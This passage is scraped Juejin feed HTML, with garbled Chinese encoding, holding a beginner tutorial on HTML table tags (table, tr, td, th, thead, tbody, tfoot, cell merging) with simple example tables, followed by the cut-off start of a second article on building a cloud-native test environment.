itemprop="url" content="https://juejin.cn/user/2225067266677640"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¹¼å„¿å›­å‰ç«¯ #11ï¼šè¡¨æ ¼æ ‡ç­¾ &lt;table&gt; â€”â€” åˆ«æ‹¿å®ƒåšå¸ƒå±€ï¼Œä½†å±•ç¤ºæ•°æ®å®ƒæ˜¯çš„ç¥ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067266677640/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Flinton
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:20:59.000Z" title="Thu Jan 22 2026 04:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>å‰è¨€</strong>ï¼š å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯[å°å¥‡è…¾]ã€‚æ¬¢è¿æ¥åˆ° <strong>â€œå¹¼å„¿å›­å‰ç«¯â€</strong> ç¬¬ 11 é›†ï¼ åœ¨ 20 å¹´å‰ï¼Œæ•´ä¸ªäº’è”ç½‘çš„ç½‘é¡µéƒ½æ˜¯ç”¨â€œè¡¨æ ¼â€åšå‡ºæ¥çš„ï¼ˆå› ä¸ºé‚£æ—¶å€™æ²¡æœ‰ CSS å¸ƒå±€ï¼‰ã€‚è™½ç„¶ç°åœ¨æˆ‘ä»¬ä¸¥ç¦æ‹¿è¡¨æ ¼åšé¡µé¢å¸ƒå±€ï¼Œä½†åœ¨å±•ç¤º**â€œäºŒç»´æ•°æ®â€**ï¼ˆæ¯”å¦‚ï¼šæˆç»©å•ã€è‚¡ç¥¨è¡Œæƒ…ã€è¯¾ç¨‹è¡¨ï¼‰æ—¶ï¼Œå®ƒä¾ç„¶æ˜¯æ— å¯æ›¿ä»£çš„ç‹è€…ã€‚ ä»Šå¤©æˆ‘ä»¬å°±åƒåœ¨ Excel é‡Œä¸€æ ·ï¼Œç”¨ä»£ç ç”»ä¸€ä¸ªæ ¼å­ï¼</p>
</blockquote>
<p>æœ¬æœŸè¯¦ç»†çš„è§†é¢‘æ•™ç¨‹bilibiliï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1R3zpBDEfD%2F%3Fvd_source%3D4213d38d889ea1581bbcae78a04cbd9d" target="_blank" title="https://www.bilibili.com/video/BV1R3zpBDEfD/?vd_source=4213d38d889ea1581bbcae78a04cbd9d" ref="nofollow noopener noreferrer">å¹¼å„¿å›­å‰ç«¯ #11ï¼šè¡¨æ ¼æ ‡ç­¾ table â€”â€” åˆ«æ‹¿å®ƒåšå¸ƒå±€ï¼Œä½†å±•ç¤ºæ•°æ®å®ƒæ˜¯çš„ç¥ï¼</a></p>
<h2 data-id="heading-0">ä¸€ã€ è¡¨æ ¼ä¸‰å‰‘å®¢ï¼šTable / TR / TD</h2>
<p>åœ¨ Excel é‡Œï¼Œæˆ‘ä»¬è¯´â€œç¬¬å‡ è¡Œç¬¬å‡ åˆ—â€ã€‚ä½†åœ¨ HTML é‡Œï¼Œ<strong>æ²¡æœ‰â€œåˆ—â€çš„æ¦‚å¿µï¼Œåªæœ‰â€œè¡Œâ€</strong> ã€‚ è¡¨æ ¼æ˜¯<strong>ä¸€è¡Œä¸€è¡Œ</strong>ç”»å‡ºæ¥çš„ã€‚</p>
<h3 data-id="heading-1">1. æ ¸å¿ƒæ ‡ç­¾</h3>
<ul>
<li><strong><code>&lt;table&gt;</code></strong> ï¼šæˆ‘æ˜¯<strong>ä¸€å¼ è¡¨</strong>ï¼ˆå¤§å®¹å™¨ï¼‰ã€‚</li>
<li><strong><code>&lt;tr&gt;</code></strong> (Table Row)ï¼šæˆ‘æ˜¯<strong>ä¸€è¡Œ</strong>ã€‚</li>
<li><strong><code>&lt;td&gt;</code></strong> (Table Data)ï¼šæˆ‘æ˜¯è¿™ä¸€è¡Œé‡Œçš„<strong>ä¸€ä¸ªå°æ ¼å­</strong>ï¼ˆå•å…ƒæ ¼ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2">2. è¿™é‡Œçš„é€»è¾‘ï¼ˆé‡ç‚¹ï¼ï¼‰</h3>
<p>ä½ å¿…é¡»å…ˆç”»å‡ºâ€œç¬¬ä¸€è¡Œâ€ï¼Œç„¶ååœ¨è¿™ä¸€è¡Œé‡Œå¡ 3 ä¸ªâ€œæ ¼å­â€ï¼› å†ç”»å‡ºâ€œç¬¬äºŒè¡Œâ€ï¼Œåœ¨é‡Œé¢å†å¡ 3 ä¸ªâ€œæ ¼å­â€ã€‚</p>
<blockquote>
<p><strong>å£è¯€</strong>ï¼š<strong>å…ˆæœ‰è¡Œï¼Œåæœ‰æ ¼ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-3">äºŒã€ åŠ¨æ‰‹å®æˆ˜ï¼šç”»ä¸€ä¸ªâ€œä¸¤è¡Œä¸‰åˆ—â€çš„è¡¨</h2>
<p>æ‰“å¼€ VS Codeï¼Œæ–°å»º <code>11-table.html</code>ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>è‹¹æœ<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>é¦™è•‰<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>æ©˜å­<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>10å…ƒ<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>20å…ƒ<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5å…ƒ<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
</code></pre>
<p><strong>æµè§ˆå™¨æ•ˆæœ</strong>ï¼š ä½ ä¼šçœ‹åˆ°ä¸€ä¸ªå¸¦è¾¹æ¡†çš„è¡¨æ ¼ï¼Œä¸Šä¸‹å¯¹å¾—æ•´æ•´é½é½ã€‚ å¦‚æœä¸å†™ <code>border="1"</code>ï¼Œå®ƒçœ‹èµ·æ¥å°±æ˜¯æ‚¬æµ®çš„æ–‡å­—ï¼Œå¾ˆéš¾çœ‹æ¸…ç»“æ„ã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€ è¡¨å¤´ä¸“ç”¨ï¼š<code>&lt;th&gt;</code></h2>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­é‡Œï¼Œâ€œè‹¹æœâ€å’Œâ€œ10å…ƒâ€é•¿å¾—ä¸€æ ·ã€‚ ä½†åœ¨æ­£è§„è¡¨æ ¼é‡Œï¼Œç¬¬ä¸€è¡Œé€šå¸¸æ˜¯<strong>æ ‡é¢˜</strong>ï¼ˆæ¯”å¦‚ï¼šå“åã€ä»·æ ¼ã€äº§åœ°ï¼‰ï¼Œéœ€è¦<strong>åŠ ç²—ã€å±…ä¸­</strong>ã€‚</p>
<p>HTML ä¸“é—¨å‡†å¤‡äº†ä¸€ä¸ªæ ‡ç­¾ï¼š <strong><code>&lt;th&gt;</code> (Table Header)</strong> ã€‚ å®ƒæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªæ ¼å­ï¼Œä½†æµè§ˆå™¨ä¼šè‡ªåŠ¨æŠŠå®ƒå˜å¾—<strong>é»‘ã€ç²—ã€å£®</strong>ã€‚</p>
<p><strong>ä¼˜åŒ–åçš„ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å“å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ä»·æ ¼<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>åº“å­˜<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>iPhone 16<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Â¥5999<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>æœ‰è´§<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
</code></pre>
<hr/>
<h2 data-id="heading-5">å››ã€ è¯­ä¹‰åŒ–ç»“æ„ï¼ˆç»™æµè§ˆå™¨çœ‹çš„ï¼‰</h2>
<p>è™½ç„¶ä¸Šé¢çš„ä»£ç èƒ½è·‘ï¼Œä½†ä¸“ä¸šçš„å†™æ³•ä¼šç»™è¡¨æ ¼åˆ†å±‚ã€‚ åƒç½‘é¡µæœ‰ Header/Body/Footer ä¸€æ ·ï¼Œè¡¨æ ¼ä¹Ÿæœ‰ï¼š</p>
<ul>
<li><strong><code>&lt;thead&gt;</code></strong> ï¼šè¡¨å¤´åŒºåŸŸï¼ˆæ”¾ç¬¬ä¸€è¡Œæ ‡é¢˜ï¼‰ã€‚</li>
<li><strong><code>&lt;tbody&gt;</code></strong> ï¼šè¡¨ä½“åŒºåŸŸï¼ˆæ”¾å‡ åè¡Œæ•°æ®ï¼‰ã€‚</li>
<li><strong><code>&lt;tfoot&gt;</code></strong> ï¼šè¡¨åº•åŒºåŸŸï¼ˆæ”¾â€œæ€»è®¡ï¼š100å…ƒâ€è¿™ç§ï¼‰ã€‚</li>
</ul>
<p>è¿™æ ·åšçš„å¥½å¤„ï¼šå¦‚æœè¡¨æ ¼ç‰¹åˆ«é•¿ï¼Œæ‰“å°çš„æ—¶å€™ï¼Œæµè§ˆå™¨å¯ä»¥æ¯ä¸€é¡µéƒ½è‡ªåŠ¨å°ä¸Šè¡¨å¤´ã€‚</p>
<p>âœ… æœ€ç»ˆä¸“ä¸šç‰ˆä»£ç ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å§“å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>è¯­æ–‡<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ•°å­¦<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>è‹±è¯­<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å¼ ä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>90<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>88<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å¼ å››<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>60<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>100<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>70<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tfoot</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å¹³å‡åˆ†<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>75<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>94<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>60<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-6">äº”ã€ å•å…ƒæ ¼åˆå¹¶ï¼ˆè¿›é˜¶æŒ‘æˆ˜ï¼‰</h2>
<p>åœ¨ Excel é‡Œæˆ‘ä»¬ç»å¸¸æŠŠä¸¤ä¸ªæ ¼å­åˆå¹¶æˆä¸€ä¸ªã€‚HTML ä¹Ÿèƒ½åšï¼Œä½†ç¨å¾®æœ‰ç‚¹ç»•ã€‚</p>
<ul>
<li><strong><code>rowspan="2"</code></strong> ï¼šæˆ‘è¦åƒæ‰<strong>ä¸‹é¢</strong>çš„ä¸€æ ¼ï¼ˆè·¨è¡Œåˆå¹¶ï¼‰ã€‚</li>
<li><strong><code>colspan="2"</code></strong> ï¼šæˆ‘è¦åƒæ‰<strong>å³è¾¹</strong>çš„ä¸€æ ¼ï¼ˆè·¨åˆ—åˆå¹¶ï¼‰ã€‚</li>
</ul>
<p><em>ï¼ˆè¿™ä¸ªå±äºè¿›é˜¶çŸ¥è¯†ï¼Œæ–°æ‰‹å¦‚æœè§‰å¾—æ™•å¯ä»¥å…ˆè·³è¿‡ï¼Œä»¥åç”¨åˆ°å†æŸ¥ã€‚ï¼‰</em></p>
<h2 data-id="heading-7">å…­ã€ é¿å‘æŒ‡å— ğŸš«</h2>
<ol>
<li><strong>åˆ«ç”¨ Table åšå¸ƒå±€</strong>ï¼š åå‡ å¹´å‰ï¼Œç¨‹åºå‘˜å–œæ¬¢ç”¨ Table æ¥æŠŠç½‘é¡µæ’æˆå·¦ä¸­å³ç»“æ„ã€‚<strong>ç°åœ¨ç»å¯¹ç¦æ­¢ï¼</strong> å¸ƒå±€è¯·ç”¨ CSSï¼ˆFlex æˆ– Gridï¼‰ï¼ŒTable åªç”¨æ¥<strong>å±•ç¤ºæ•°æ®</strong>ã€‚</li>
<li><strong>åˆ«å¿˜äº† <code>tr</code></strong>ï¼š å¾ˆå¤šæ–°æ‰‹ä¼šç›´æ¥åœ¨ <code>&lt;table&gt;</code> é‡Œå†™ <code>&lt;td&gt;</code>ï¼Œè¿™æ˜¯è¿æ³•çš„ã€‚ä¸€å®šè¦è®°ä½ï¼š<strong>æ ¼å­å¿…é¡»åŒ…åœ¨è¡Œé‡Œé¢ï¼</strong></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶æ„å»ºäº‘åŸç”Ÿâ€œè¯•éªŒç”°â€ï¼šè¶…èåˆçš„è‡ªæˆ‘ä¿®å…»]]></title>    <link>https://juejin.cn/post/7597724783648735272</link>    <guid>https://juejin.cn/post/7597724783648735272</guid>    <pubDate>2026-01-22T04:33:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597724783648735272" data-draft-id="7597695487303565327" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶æ„å»ºäº‘åŸç”Ÿâ€œè¯•éªŒç”°â€ï¼šè¶…èåˆçš„è‡ªæˆ‘ä¿®å…»"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-22T04:33:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¶æ„è§£ç è€…"/> <meta itemprop="url" content="https://juejin.cn/user/898745352588576"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶æ„å»ºäº‘åŸç”Ÿâ€œè¯•éªŒç”°â€ï¼šè¶…èåˆçš„è‡ªæˆ‘ä¿®å…»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/898745352588576/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¶æ„è§£ç è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:33:45.000Z" title="Thu Jan 22 2026 04:33:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 